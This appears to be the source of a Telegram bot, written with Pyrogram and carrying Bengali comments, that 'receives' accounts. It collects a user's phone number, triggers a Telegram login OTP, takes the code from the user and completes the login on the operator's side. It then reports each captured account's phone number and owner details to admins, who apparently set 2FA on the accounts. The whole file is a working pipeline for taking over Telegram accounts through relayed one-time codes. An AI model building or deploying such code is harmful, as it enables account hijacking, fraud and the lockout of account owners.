from pyrogram import enums, filters
from pyrogram.types import CallbackQuery, Message

from utils import keyboards as kb


def register_user_handlers(
    bot,
    config,
    tg_engine,
    user_sessions,
    admin_state,
):
    @bot.on_message(filters.command("start") & filters.private)
    async def start_handler(client, message: Message):
        user_id = message.from_user.id
        first_name = message.from_user.first_name or "there"
        
        admin_state[user_id] = None
        if user_id in user_sessions:
            del user_sessions[user_id]

        welcome_text = (
            f"👋 <b>Hello, {first_name}!</b>\n\n"
            "Welcome to our <b>Account receiver Robot</b>! 🤖\n\n"
            "To get started, please send your phone number.\n"
            "📌 <b>Example:</b> <code>+8801700000000</code> or <code>14165550123</code>"
        )

        await message.reply_text(welcome_text, parse_mode=enums.ParseMode.HTML)

    @bot.on_callback_query(filters.regex(r"^user:cancel$"))
    async def user_cancel_callback(client, query: CallbackQuery):
        user_id = query.from_user.id
        
        if user_id in user_sessions:
            user_sessions[user_id]["cancelled"] = True
            tg_client = user_sessions[user_id].get("client")
            if tg_client and tg_client.is_connected:
                try:
                    await tg_client.disconnect()
                except Exception:
                    pass
            del user_sessions[user_id]
            
        admin_state[user_id] = None
        await query.answer("Process cancelled.")
        if query.message:
            await query.message.edit_text("❌ Process cancelled successfully.")

    @bot.on_message(filters.private & filters.text)
    async def user_message_handler(client, message: Message):
        user_id = message.from_user.id
        
        # অ্যাডমিন যদি প্যানেলের কোনো কাজে থাকে (যেমন: Country add বা 2FA set), তবে তা Admin Handler দেখবে
        if user_id in config.admin_ids and admin_state.get(user_id) is not None:
            await message.continue_propagation()
            return

        text = message.text.strip()
        user = message.from_user

        if text in ["❌ Cancel Process", "/cancel"]:
            if user_id in user_sessions:
                user_sessions[user_id]["cancelled"] = True
                tg_client = user_sessions[user_id].get("client")
                if tg_client and tg_client.is_connected:
                    try:
                        await tg_client.disconnect()
                    except Exception:
                        pass
                del user_sessions[user_id]
            admin_state[user_id] = None
            await message.reply_text("❌ Process cancelled successfully.")
            return

        formatted_phone = config.format_phone_number(text)

        if (
            formatted_phone.replace("+", "").isdigit()
            and len(formatted_phone) >= 8
            and user_id not in user_sessions
        ):
            if not config.is_country_allowed(formatted_phone):
                await message.reply_text("❌ এই কান্ট্রির নম্বর এই বটে গ্রহণযোগ্য নয়।")
                return

            c_info = config.get_country_info(formatted_phone)
            if c_info:
                wait_text = f"⏳ <b>{c_info['name']} {c_info['flag']} ({c_info['dial_code']})</b> নম্বরে OTP পাঠানো হচ্ছে। অনুগ্রহ করে অপেক্ষা করুন..."
            else:
                wait_text = f"⏳ <b>{formatted_phone}</b> নম্বরে OTP পাঠানো হচ্ছে। অনুগ্রহ করে অপেক্ষা করুন..."

            sent_wait_msg = await message.reply_text(
                wait_text,
                reply_markup=kb.get_cancel_keyboard(),
                parse_mode=enums.ParseMode.HTML,
            )

            user_sessions[user_id] = {"cancelled": False, "client": None}

            try:
                result = await tg_engine.send_otp(formatted_phone)
                
                if user_id not in user_sessions or user_sessions[user_id].get("cancelled"):
                    if result.get("client") and result["client"].is_connected:
                        await result["client"].disconnect()
                    return

                user_sessions[user_id] = {
                    "phone": result["formatted_phone"],
                    "client": result["client"],
                    "hash": result["phone_hash"],
                    "cancelled": False
                }
                
                await sent_wait_msg.edit_text(
                    "📩 OTP Sent! Send code here:",
                    reply_markup=kb.get_cancel_keyboard(),
                )

            except Exception as error:
                error_message = str(error)
                if user_id in user_sessions and not user_sessions[user_id].get("cancelled"):
                    await sent_wait_msg.edit_text(f"❌ Error: {error_message}")
                    await notify_admins_about_error(
                        bot,
                        config,
                        user,
                        formatted_phone,
                        error_message,
                        "OTP Sending",
                    )
                user_sessions.pop(user_id, None)

        elif text.isdigit() and user_id in user_sessions:
            session = user_sessions[user_id]
            await message.reply_text("⚡ Verifying...")

            try:
                result = await tg_engine.complete_login(
                    client=session["client"],
                    phone_number=session["phone"],
                    phone_hash=session["hash"],
                    otp_code=text,
                )

                if result["status"] == "success":
                    await message.reply_text("✅ Account successfully received!")

                    username = f"@{user.username}" if user.username else "No Username"
                    c_info = result.get("country_info")
                    country_str = f"{c_info['name']} {c_info['flag']} ({result['country']})" if c_info else result["country"]

                    notify_text = (
                        "🎉 New Account Added Successfully!\n\n"
                        f"Adder Name: {user.first_name} {user.last_name or ''}\n"
                        f"User ID: {user.id}\n"
                        f"Username: {username}\n"
                        f"Phone Number: {result['formatted_phone']}\n"
                        f"Country: {country_str}\n"
                        f"2FA Status: {'Enabled' if config.use_2fa else 'Disabled'}"
                    )
                    for admin_id in config.admin_ids:
                        try:
                            await bot.send_message(admin_id, notify_text)
                        except Exception:
                            pass
                else:
                    error_message = result.get("message", "Unknown Error")
                    await message.reply_text(f"❌ Login Failed: {error_message}")
                    await notify_admins_about_error(
                        bot,
                        config,
                        user,
                        session["phone"],
                        error_message,
                        "Login Verification",
                    )

            except Exception as error:
                error_message = str(error)
                await message.reply_text(f"❌ Login Failed: {error_message}")
                await notify_admins_about_error(
                    bot,
                    config,
                    user,
                    session["phone"],
                    error_message,
                    "Login Process Exception",
                )

            del user_sessions[user_id]

    return user_message_handler


async def notify_admins_about_error(
    bot,
    config,
    user,
    phone_number: str,
    error_message: str,
    stage: str,
):
    username = f"@{user.username}" if user.username else "No Username"
    error_text = (
        "⚠️ User Account Addition Failed!\n\n"
        f"User: {user.first_name} {user.last_name or ''}\n"
        f"User ID: {user.id}\n"
        f"Username: {username}\n"
        f"Phone Number: {phone_number}\n"
        f"Stage: {stage}\n"
        f"Error Details: {error_message}"
    )
    for admin_id in config.admin_ids:
        try:
            await bot.send_message(admin_id, error_text)
        except Exception:
            pass
